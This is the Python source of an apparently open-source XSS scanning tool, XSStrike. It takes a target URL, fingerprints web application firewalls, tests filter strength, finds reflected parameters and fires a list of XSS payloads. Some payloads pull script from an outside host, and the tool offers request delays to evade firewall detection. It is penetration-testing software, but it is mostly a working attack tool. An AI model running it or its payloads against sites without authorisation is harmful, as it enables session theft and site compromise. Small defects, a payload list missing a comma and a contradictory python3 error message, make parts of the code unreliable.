#!/usr/bin/env python3

#Colors and shit like that
white = '\033[97m'
green = '\033[92m'
red = '\033[91m'
yellow = '\033[93m'
end = '\033[0m'
back = '\033[7;91m'
info = '\033[93m[!]\033[0m'
que = '\033[94m[?]\033[0m'
bad = '\033[91m[-]\033[0m'
good = '\033[32m[+]\033[0m'
run = '\033[97m[~]\033[0m'

import requests
import re # Module for RegEx
import sys # Standars system library
import os # Standard module for system related operations
import webbrowser # To open pages in "real" browers
import random
try:
    from core.injector import inject
except:
    print ('\033[91m[-]\033[0m XSStrike isn\'t compatible with python3. Run it with python3 i.e. \033[7;92mpython3 xsstrike\033[0m')
    quit()
from core.fuzzer import fuzzer
from core.paramfinder import paramfinder
from core.make_request import make_request
from urllib.parse import parse_qs, quote_plus
from urllib.parse import urlparse as parsy
from time import sleep # To pause the program for a specific time

date = '15-06-2018'

def update():
    print('%s Checking for updates...' % run)
    xsstrike = requests.get('http://github.com/UltimateHackers/XSStrike/blob/master/xsstrike').text
    if date not in xsstrike:
        choice = input('%s A new version of XSStrike is available. Would you like to update? [Y/n] ' % que).lower()
        if choice != 'n':
            os.system('cd .. && rm -r XSStrike && git clone https://github.com/UltimateHackers/XSStrike')

xsschecker = 'v3dm0s' # A non malicious string to check for reflections and stuff
paranames = [] # list for storing parameter names
paravalues = [] # list for storing parameter values 

NUM_REFLECTIONS = 0 # Number of reflections
OCCURENCE_NUM = 0 # Occurence number
OCCURENCE_PARSED = 0 # Occurence parsed by the parser

occur_number = []
occur_location = []

delay = 0

payloads = [ # Payloads for blind xss and simple bruteforcing
'\'"</Script><Html Onmouseover=(confirm)()//'
'<imG/sRc=l oNerrOr=(prompt)() x>',
'<!--<iMg sRc=--><img src=x oNERror=(prompt)`` x>',
'<deTails open oNToggle=confi\u0072m()>',
'<img sRc=l oNerrOr=(confirm)() x>',
'<svg/x=">"/onload=confirm()//',
'<svg%0Aonload=%09((pro\u006dpt))()//',
'<iMg sRc=x:confirm`` oNlOad=e\u0076al(src)>',
'<sCript x>confirm``</scRipt x>',
'<Script x>prompt()</scRiPt x>',
'<sCriPt sRc=//14.rs>',
'<embed//sRc=//14.rs>',
'<base href=//14.rs/><script src=/>',
'<object//data=//14.rs>',
'<s=" onclick=confirm``>clickme',
'<svG oNLoad=co\u006efirm&#x28;1&#x29>',
'\'"><y///oNMousEDown=((confirm))()>Click',
'<a/href=javascript&colon;co\u006efirm&#40;&quot;1&quot;&#41;>clickme</a>',
'<img src=x onerror=confir\u006d`1`>',
'<svg/onload=co\u006efir\u006d`1`>']

# Banner
print('''  %s____  ___  _________ _________ __          __ __           
  \   \/  / /   _____//   _____//  |________|__|  | __ ____  
  %s \     /  \_____  \ \_____  \\\\   __\_  __ \  |  |/ // __ \ 
   /     \  /        \/        \|  |  |  | \/  |    <\  ___/%s 
  /___/\  \/_______  /_______  /|__|  |__|  |__|__|_ \\\\___  >
        \_/        \/        \/                     \/    \/ v2%s.%s0%s\n''' % (white,red,white,red,white, end))

##################
#   WAF Detector
##################

#Function to detect WAF by analysing HTTP response codes
def WAF_detector(url, param_data, method):
    global WAF
    WAF = False
    noise = quote_plus('<script>confirm()</script>') #a payload which is noisy enough to provoke the WAF
    fuzz = param_data.replace(xsschecker, noise) #Replaces xsschecker in param_data with noise
    sleep(delay) # Pausing the program. Default = 0 sec. In case of WAF = 6 sec.
    if method == 'GET':
        response = requests.get(url + fuzz) # Opens the noise injected payload
    else:
        response = requests.post(url, data=fuzz) # Opens the noise injected payload
    code = str(response.status_code)
    response_headers = str(response.headers)
    if code[:1] != '2':
        if '406' == code or '501' == code: # if the http response code is 406/501
            WAF_Name = 'Mod_Security'
            WAF = True
        elif 'wordfence' in response.text.lower():
            WAF_Name = 'Wordfence'
            WAF = True
        elif '999' == code: # if the http response code is 999
            WAF_Name = 'WebKnight'
            WAF = True
        elif 'has disallowed characters' in response.text.lower():
            WAF_Name = 'CodeIgniter'
            WAF = True
        elif 'comodo' in response.text.lower():
            WAF_Name = 'Comodo'
            WAF = True
        elif 'sucuri' in response.text.lower():
            WAF_Name = 'Sucuri'
            WAF = True
        elif '419' == code: # if the http response code is 419
            WAF_Name = 'F5 BIG IP'
            WAF = True
        elif 'barra' in response_headers:
            WAF_Name = 'Barracuda'
            WAF = True
        elif re.search(r'cf[-|_]ray', response_headers):
            WAF_Name = 'Cloudflare'
            WAF = True
        elif 'AkamaiGHost' in response_headers:
            WAF_Name = 'AkamaiGHost'
            WAF = True
        elif '403' == code: # if the http response code is 403
            WAF_Name = 'Unknown'
            WAF = True
    else:
        print('%s WAF Status: Offline' % good)
    if WAF:
        print('%s WAF Detected: %s' % (bad, WAF_Name))

###################
#   Filter Checker
###################

def filter_checker(url, param_data, method):
    strength = '' # A variable for containing strength of the filter
    # Injecting a malicious payload first by replacing xsschecker with our payload
    try:
        low_string = param_data.replace(xsschecker, quote_plus('<svg/onload=(confirm)()>'))
        sleep(delay) # Pausing the program. Default = 0 sec. In case of WAF = 6 sec.
        if method == 'GET':
            low_request = requests.get(url + low_string).text
        else:
            low_request = requests.post(url, data=low_string).text
        if '<svg/onload=(confirm)()>' in low_request: # If payload was reflected in response
            print("%s Filter Strength : %sLow or None%s" % (good, green, end))
            print('%s Payload: <svg/onload=(confirm)()>' % good)
            print('%s Efficiency: 100%%' % good)
            choice = input('%s A payload with 100%% efficiency was found. Continue scanning? [y/N] ' % que).lower()
            if choice == 'y':
                pass
            else:
                if method == 'GET':
                    webbrowser.open(url+param_data.strip(xsschecker)+'<svg/onload=(confirm)()>')
                    quit()
            strength = 'low' # As a malicious payload was not filtered, the filter is weak
        else: # If malicious payload was filtered (was not in the response)
            # Now we will use a less malicious payload
            medium_string = param_data.replace(xsschecker, quote_plus('<zz onxx=yy>'))
            sleep(delay) # Pausing the program. Default = 0 sec. In case of WAF = 6 sec.
            if method == 'GET':
                medium_request = requests.get(url + medium_string).text
            else:
                medium_request = requests.post(url, data=medium_string).text
            if '<zz onxx=yy>' in medium_request:
                print('%s Filter Strength : %sMedium%s' % (info, yellow, end))
                strength = 'medium'
            else: #Printing high since result was not medium/low
                print('%s Filter Strength : %sHigh%s' % (bad, red, end))
                strength = 'high'
                
            return strength
    except Exception as e:
        try:
            print('%s Target doesn\'t seem to respond properly. Error Code: %s' % (bad, re.search(r'\d\d\d', str(e)).group()))
        except:
            print('%s Target doesn\'t seem to respond properly.' % bad)

##################
#   Locater
##################

def html_parser(response):
    parts = response.split(xsschecker)
    parts.remove(parts[0])
    parts = [xsschecker + s for s in parts]
    number = 0
    for part in parts:
        number = number + 1
        deep = part.split('>')
        if '</script' in deep[0]:
            location = 'script'
        elif '</' in deep[0]:
            location = 'html'
        elif deep[0][:2] == '--':
            location = 'comment'
        else:
            location = 'attribute'
        occur_location.append(location)
        occur_number.append(number)

def locater(url, param_data, method):
    sleep(delay) # Pausing the program. Default = 0 sec. In case of WAF = 6 sec.
    response = make_request(url, param_data, method) # Makes request to the target
    if(xsschecker in response.lower()): # if the xsschecker is found in the response
        global NUM_REFLECTIONS # The number of reflections of xsschecker in the response
        NUM_REFLECTIONS = response.lower().count(xsschecker.lower()) # Counts number of time d3v got reflected in webpage
        print('%s Number of reflections found: %i' % (info, NUM_REFLECTIONS))
        html_parser(response)
    else: #Launched hulk if no reflection is found. Hulk Smash!
        print('%s No reflection found.' % bad)

###################
#   Param Parser
###################

def param_parser(target, param_data, method):
    global url
    if method == 'POST':
        target = target + '?' + param_data
    parsed_url = parsy(target)
    url = parsed_url.scheme+'://'+parsed_url.netloc+parsed_url.path
    parameters = parse_qs(parsed_url.query, keep_blank_values=True)
    for para in parameters:
        for i in parameters[para]:
            paranames.append(para)
            paravalues.append(i)

##################
#   Initiator
##################

def initiator(url, method):
    choice = input('%s Would you like to look for hidden parameters? [y/N] ' % que)
    if choice == 'y':
        paramfinder(url, method, paranames, paravalues)
    if len(paranames) == 0:
        print('%s No parameters to test.' % bad)
        quit()
    else:
        if method == 'GET':
            WAF_detector(url, '?'+paranames[0]+'='+xsschecker, method)
            current_param = 0
            for param_name in paranames:
                print(('%s-%s' % (red, end)) * 50)
                print('%s Testing parameter %s%s%s' % (run, green, param_name, end))
                
                paranames_combined = []
                for param_name, param_value in zip(paranames, paravalues):
                    paranames_combined.append('&' + param_name + '=' + param_value)
                
                new_param_data = []
                current = '&' + paranames[current_param] + '='
                for i in paranames_combined:
                    if current in i:
                        pass
                    else:
                        new_param_data.append(i)
                
                param_data = '?' + paranames[current_param] + '=' + xsschecker + ''.join(new_param_data)
                if WAF:
                    choice = input('%s A WAF is active on the target. Would you like to delay requests to evade suspicion? [y/N] ' % que)
                    if choice == 'y':
                        delay = 6
                    else:
                        delay = 0
                    fuzzer(url, param_data, method, delay) #Launches fuzzer aka Ninja
                filter_checker(url, param_data, method) # Launces filter checker
                locater(url, param_data, method) # Launcher locater
                if len(occur_number) == 0:
                    choice = input('%s Would you like to launch hulk for blind XSS detection? [Y/n] ' % que).lower()
                    if choice != 'n':
                        for payload in payloads:
                            param_data = param_data.replace(xsschecker, payload) # Replaces the xsschecker with payload
                            print('%s Payload: %s' % (info, payload))
                            webbrowser.open(url + param_data) # Opens the "injected" URL in browser
                            next = input('%s Press enter to execute next payload ' % que)
                            #resetting payload
                            param_data = param_data.replace(payload, xsschecker)
                inject(url, param_data, method, occur_number, occur_location) # Launches injector
                del occur_number[:] # Clears the occur_number list
                del occur_location[:] # Clears the occur_location list
                current_param = current_param + 1

        elif method == 'POST':
            WAF_detector(url, '?'+paranames[0]+'='+xsschecker, method)
            current_param = 0
            for param_name in paranames:
                print(('%s-%s' % (red, end)) * 50)
                print('%s Testing parameter %s%s%s' % (run, green, param_name, end))
                paranames_combined = []
                new_param_data = []
                for param_name, param_value in zip(paranames, paravalues):
                    paranames_combined.append('&' + param_name + '=' + param_value)
                current = '&' + paranames[current_param] + '='
                for i in paranames_combined:
                    if current in i:
                        pass
                    else:
                        new_param_data.append(i)
                param_data = paranames[current_param] + '=' + xsschecker + ''.join(new_param_data)
                if WAF:
                    choice = input('%s A WAF is active on the target. Would you like to delay requests to evade suspicion? [y/N] ' % que)
                    if choice == 'y':
                        delay = 6
                    else:
                        delay = 0
                    fuzzer(url, param_data, method, delay) # Launches fuzzer aka Ninja
                filter_checker(url, param_data, method) # Launches filter checker
                locater(url, param_data, method) # Launches locater
                if len(occur_number) == 0:
                    choice = input('%s Would you like to generate some payloads for blind XSS? [Y/n] ' % que).lower()
                    if choice == 'n':
                        quit()
                    else:
                        for payload in payloads: # We will print the payloads from the payloads list
                            print('%s  %s' % (info, payload))
                            inject(url, param_data, method) # Launches injector
                            del occur_number[:]
                            del occur_location[:]
                            current_param = current_param + 1
                inject(url, param_data, method, occur_number, occur_location) # Launches injector
                del occur_number[:] # Clears the occur_number list
                del occur_location[:] # Clears the occur_location list
                current_param = current_param + 1

##############
#   Input
##############

def main():
    target = input('%s Enter a url: ' % que)
    cookie = input('%s Enter cookie (if any): ' % que)
    if 'http' in target: # if the target has http in it, do nothing
        pass
    else:
        try:
            requests.get('http://%s' % target) # Makes request to the target with http schema
            target = 'http://%s' % target
        except: # if it fails, maybe the target uses https schema
            target = 'https://%s' % target

    try:
        requests.get(target) # Makes request to the target
    except Exception as e: # if it fails, the target is unreachable
        if 'ssl' in str(e).lower():
            target = 'http://%s' % target
        else:
            print('%s Unable to connect to the target.' % bad)
            quit()
    
    if '=' in target: # A url with GET request must have a = so...
        method = 'GET'
        param_data = ''
        param_parser(target, param_data, method)
        initiator(url, method)
    else:
        choice = input('%s Does it use POST method? [Y/n] ' % que).lower()
        if choice == 'n':
            method = 'GET'
            initiator(target, method)
        else:
            method = 'POST'
            param_data = input('%s Enter POST data: ' % que)
            param_parser(target, param_data, method)
            initiator(url, method)

main() #This is the true start of the program
